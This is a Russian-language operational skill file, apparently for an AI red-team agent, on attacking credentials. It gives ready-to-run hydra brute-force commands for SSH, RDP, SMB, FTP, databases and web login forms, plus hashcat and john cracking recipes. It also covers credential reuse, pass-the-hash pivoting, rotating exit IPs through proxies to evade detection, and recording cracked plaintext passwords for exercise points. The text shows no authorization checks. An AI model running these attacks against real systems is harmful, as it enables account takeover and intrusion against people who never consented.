# Атака на учётные данные (онлайн-брутфорс + офлайн-взлом)

Один из двух самых надёжных путей «получить доступ к аккаунту» в red team (второй — утечка конфигурации или исходников с открытым паролем).
**Этот навык только подбирает пароль**; после подбора нужно через навык `browser-automation` / `kimi-webbridge`
**один раз войти в реальном браузере** — только тогда доступ к аккаунту считается полученным (красная линия: сами по себе учётные данные — ещё не доступ).

## Инструменты на этой машине

| Инструмент | Путь | Версия | Назначение |
| --- | --- | --- | --- |
| **hydra** | `/usr/bin/hydra` | 9.7 | Онлайн-брутфорс, 50+ протоколов |
| **hashcat** | `/usr/bin/hashcat` | 7.1.2 | Офлайн-взлом хешей (GPU/CPU) |
| **john** | `/usr/sbin/john` | — | Офлайн-взлом (сам определяет формат, простая настройка) |

Словари: `/usr/share/wordlists/` (включая `rockyou.txt`, нужен gunzip), `/usr/share/seclists/Passwords/`.
**Если rockyou нет — сначала распакуйте**: `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` (нужна авторизация; если её нет — берите словари из seclists).

## 1. Онлайн-брутфорс (hydra)

### Общий синтаксис
```bash
hydra -L users.txt -P pass.txt <protocol>://<target>[:port] [модуль] -t <параллельность> -f -o runs/hydra-<target>.txt
```
- `-L` словарь имён пользователей / `-l` одно имя; `-P` словарь паролей / `-p` один пароль
- `-t` параллельность (**по умолчанию 16, не превышайте 16** — большинство сервисов блокирует аккаунт или IP)
- `-f` остановиться на первом попадании (чтобы не заблокировать аккаунт)
- `-o` вывод в `runs/` (по нему воспроизводить отчёт)
- `-V` показывать каждую попытку (для отладки, в боевом прогоне не включать)

### Примеры по протоколам
```bash
# SSH
hydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f -o runs/hydra-ssh-10.0.0.5.txt

# RDP (внимание: параллельность должна быть низкой, Windows блокирует аккаунт)
hydra -L users.txt -P pass.txt rdp://10.0.0.6 -t 2 -f -o runs/hydra-rdp-10.0.0.6.txt

# SMB
hydra -L users.txt -P pass.txt smb://10.0.0.7 -t 4 -f

# FTP
hydra -L users.txt -P pass.txt ftp://10.0.0.8 -t 6 -f

# MySQL
hydra -L users.txt -P pass.txt mysql://10.0.0.9 -t 4 -f

# MSSQL
hydra -L users.txt -P pass.txt mssql://10.0.0.10 -t 4 -f

# вход через веб-форму (POST) — самый частый случай
hydra -L users.txt -P pass.txt target.example.com http-post-form \
  "/admin/login.jsp:username=^USER^&password=^PASS^:F=<строка ошибки входа>" -t 8 -f -o runs/hydra-web-admin.txt

# веб-форма (с дополнительными заголовками/HTTPS)
hydra -L users.txt -P pass.txt -s 443 -S target.example.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:F=invalid:H=Cookie: JSESSIONID=xxx" -t 8 -f
```

### Определение успеха и неудачи при брутфорсе веб-форм (важно)
Третий сегмент `http-post-form`: `"<путь>:<POST-тело>:<условие неудачи>"`, **условие неудачи должно быть точным**, иначе будут сплошные ложные срабатывания:
- `F=<строка неудачи>`: строка есть в ответе — значит **неудача** (рекомендуется, самый надёжный вариант)
- `S=<строка успеха>`: строка есть в ответе — значит **успех** (когда единого текста ошибки нет)
- Сначала вручную отправьте два запроса (с неверным и с верным паролем, либо сравните с несуществующим пользователем) и **убедитесь, что строка уникальна**, только потом запускайте брутфорс.
- Есть капча / графический код / слайдер: сначала проверьте, можно ли обойти (фиксированная капча, капча без проверки, проверка только на фронтенде); если обойти нельзя — **не ломитесь силой** (в навыке `browser-automation` возможны ограниченные попытки с капчей), ищите другой путь.

### Приоритет словарей (ключ к экономии времени)
1. **Небольшой целевой словарь** (лучшая результативность): комбинации названия организации/бренда/домена/года, например `Орг@2026`, `Admin@123`, `<домен>2026`;
   составляйте на месте по title и данным организации из `redteam_asset_query`.
2. **Словарь паролей по умолчанию**: заводские пароли продуктов (`admin/admin`, `tomcat/tomcat`, `weblogic/weblogic1`, `sa/sa`),
   см. шаблоны nuclei `http/default-logins/` (307 штук), **сначала запросите `redteam_poc_search`**.
3. **ТОП частых слабых паролей**: 10-million / top-100 и подобные из `/usr/share/seclists/Passwords/Common-Credentials/`.
4. Общие большие словари (rockyou) — в самом конце: медленно и шумно.

### Откуда брать имена пользователей
- Веб-админка: тексты ошибок, аккаунты по умолчанию в JS, поле `createBy` в ответах API, подсказки на странице входа, `robots.txt`, префиксы корпоративных почт;
- Если брутфорс каталогов попал в `/admin`, в первую очередь пробуйте `admin`, `administrator`, `system`, `test`, `guest`;
- Получив одни учётные данные, переходите к **переиспользованию учётных данных** (см. ниже) — это намного быстрее брутфорса.

## 2. Офлайн-взлом (hashcat / john)

Получив хеши или шифротекст (база данных, конфиги, `/etc/shadow`, БД веб-приложения), работайте офлайн: **трафика на стороне цели нет**, это гораздо безопаснее онлайн-брутфорса.

```bash
# 1) сначала определить тип хеша
hashcat --identify hashes.txt

# 2) NTLM (Windows)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -O -w 3

# 3) NetNTLMv2 (перехваченный Responder)
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt

# 4) MD5 / SHA1 (БД веб-приложения)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt

# 5) bcrypt (WordPress / PHP)
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt

# 6) добавить правила (увеличивают словарь в 10 раз, лучшее соотношение затрат и результата)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 7) взлом по маске (политика паролей известна, например цифры + заглавные буквы)
hashcat -m 1000 hashes.txt -a 3 '?u?l?l?l?l?d?d?d?d'
```

```bash
# john: формат определяет сам, настройки в ~/.john/john.conf
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt
```

**Внимание**: на этой машине может не быть GPU, `hashcat` на CPU будет медленным — предпочитайте правила с небольшим словарём либо сохраните хеши в `runs/` для последующей обработки;
**не подвешивайте взлом на несколько часов**: если не подбирается, атакуйте прямо по хешу (Pass-the-Hash, см. навык `lateral-movement`).

## 3. Переиспользование учётных данных (намного быстрее брутфорса, делать в первую очередь)

Получив любую пару учётных данных, **сначала попробуйте её вширь**, не спешите ломать следующую:
1. `redteam_credential_list` — посмотреть имеющиеся учётные данные (имя, пароль, источник);
2. тем же паролем: другие такие же системы, админки других активов, SSH/RDP/SMB/БД, VPN/бастион/платформа эксплуатации;
3. закономерности имён (`фамилия.имя`, табельный номер, префикс почты) вместе с известным паролем — по другим пользователям той же системы;
4. прямое переиспользование хеша: PtH / Pass-the-Key (навык `lateral-movement`).

## 4. Дисциплина и границы (обязательно)

1. **Сначала смотрите базу**: `redteam_credential_list` / `redteam_asset_query` — не ломайте повторно тот же вход (у кого `blocked_count>0`, сначала разберитесь в причине).
2. **Риск блокировки**: Windows (RDP/SMB) и OA/доменные аккаунты — **строгое ограничение**: `-t 2` (Windows), `-t 4` (SSH/FTP),
   словарь не больше сотни строк; **после 5 неудач подряд по одному аккаунту — стоп**, меняйте аккаунт или цель: заблокировать аккаунт значит уничтожить вход.
3. **Больше 3 блокировок по одной цели — прекратить** (`redteam_asset_test` status=abandoned + blocked=true).
4. **Снижение шума через прокси**: для брутфорса веб-форм меняйте выходной IP через навык `cn-proxy-pool`; для целей во внутренней сети — туннель suo5.
5. **Во внутренней сети в приоритете fscan**: массовую проверку слабых паролей в сегменте внутренней сети отдавайте навыку `fscan-intranet` (брутфорс 28 типов сервисов за один проход),
   hydra — для протоколов, которые fscan не покрывает, или для точечной работы с тонким контролем.

## 5. Вывод и запись в базу (обязательно)

1. **Каждое попадание сразу `redteam_credential_add`**:
   - `username`, **открытый пароль в `secret_value`** (панель показывает его сразу, удобно переиспользовать), `source` (`слабый пароль`/`пароль по умолчанию`/`переиспользование`/`утечка`/`офлайн-взлом`),
     `tool` (фактический текст команды, например `hydra -L users.txt -P pass.txt ssh://10.0.0.5 -t 4 -f`), `secret_ref` (путь к файлу доказательств, например `runs/hydra-ssh-10.0.0.5.txt`).
2. **Очки только за фактически проверенный вход**: для веб-админки реально войти через `browser-automation` / `kimi-webbridge`
   (открыть страницу входа → ввести логин и пароль → убедиться, что попали в админку → записать заголовок страницы/меню/текущего пользователя → сохранить Cookie как доказательство) →
   `redteam_access_add` (`method=web-login`) → `redteam_score_hit` (`web-app` 10 баллов / `web-app` 20 баллов,
   в `evidence` писать «актив｜админка tomcat/Tomcat@2024»).
   **Если войти не удалось — запишите строку о затыке в `test` у `redteam_asset_test`** (хеш не подобран/нужна двухфакторная аутентификация/ограничение по IP источника/аккаунт отключён), очки не начисляются.
3. **Доступ к аккаунту ограничен уровнем сервиса**: по одному активу и одному порту очки начисляются один раз; получив администратора, вы забираете сервис целиком — не фармите несколько аккаунтов на одном сервисе.
4. Каждое ключевое действие — `redteam_chain_add`: `stage_code=internet` (или `internal`),
   в `tool` — фактическая команда, в `result` — выдержка вывода (например `ssh 10.0.0.5 вход root/Root@123 успешен, uid=0(root)`).
5. Файлы хешей и результаты взлома — всегда в `runs/`.
